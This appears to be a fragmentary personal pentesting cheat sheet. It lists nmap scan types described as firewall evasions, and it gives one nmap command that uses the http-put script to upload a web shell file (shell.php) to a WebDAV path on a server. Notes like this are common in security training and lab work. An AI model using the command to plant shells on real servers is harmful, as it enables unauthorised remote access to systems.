# 


SYN stealth scan:

Types of port scans for firewall evasions: 'NULL (-sN)', 'FIN (-sF)', 'Xmas (-sX)'

```
>>> nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php'
```

